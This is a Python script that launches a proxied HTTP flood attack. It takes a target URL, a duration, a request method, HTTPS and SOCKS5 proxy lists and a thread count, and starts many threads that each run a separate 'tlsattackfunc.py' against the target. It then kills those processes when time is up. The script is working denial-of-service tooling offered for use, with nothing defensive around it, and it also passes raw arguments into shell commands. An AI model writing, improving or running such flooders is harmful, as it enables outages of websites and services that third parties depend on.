import time
import threading
import sys
import colorama
colorama.init(autoreset=True)
from colorama import Fore
import os

try:
    target = str(sys.argv[1])
    timer = float(sys.argv[2])
    method = str(sys.argv[3]).upper()
    proxfile1 = str(sys.argv[4])
    proxfile2 = str(sys.argv[5])
    threads = int(sys.argv[6])
except:
    print("\n[+] Usage: <url> <Time> <get/post/head/mix> <https.txt> <socks5.txt> <threads>")
    sys.exit()

if method == "GET":
    pass
elif method == "POST":
    pass
elif method == "HEAD":
    pass
elif method == "MIX":
    pass
else:
    print(f"\n{Fore.RED}{method} Is not a attack method.")
    sys.exit()

try:
    open(proxfile1).read().split()
except:
    print(f"{Fore.RED}{proxfile1} Does not exist.")
    sys.exit()
try:
    open(proxfile2).read().split()
except:
    print(f"{Fore.RED}{proxfile2} Does not exist.")
    sys.exit()

def send():
    os.system(f"python3 tlsattackfunc.py {target} {timer} {method} {proxfile1} {proxfile2}")

thread_count = 1

for x in range(threads):
    threading.Thread(target=send).start()
    print("Thread " + str(thread_count) + " Started Attacking")
    thread_count += 1

time.sleep(timer)
os.system(f"pkill {target} -f")